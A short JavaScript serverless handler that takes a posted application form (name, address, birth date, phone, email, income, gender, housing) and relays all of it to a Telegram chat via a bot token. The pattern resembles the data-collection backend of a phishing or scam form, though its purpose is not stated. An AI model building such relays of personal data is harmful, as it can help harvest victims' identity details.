export default async function handler(req, res) {

if (req.method !== "POST") {
return res.status(405).json({ success: false });
}

const {
name, address, dob, phone, email,
occupation, income, packageType,
gender, housing
} = req.body;

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const message = `
📥 NEW APPLICATION

👤 Name: ${name}
🏠 Address: ${address}
🎂 DOB: ${dob}
📞 Phone: ${phone}
📧 Email: ${email}
💼 Occupation: ${occupation}
💰 Income: ${income}
📦 Package: ${packageType}
🚻 Gender: ${gender}
🏡 Housing: ${housing}
`;

try {

await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
method: "POST",
headers: {
"Content-Type": "application/json"
},
body: JSON.stringify({
chat_id: CHAT_ID,
text: message
})
});

return res.status(200).json({ success: true });

} catch (error) {
return res.status(500).json({ success: false });
}
}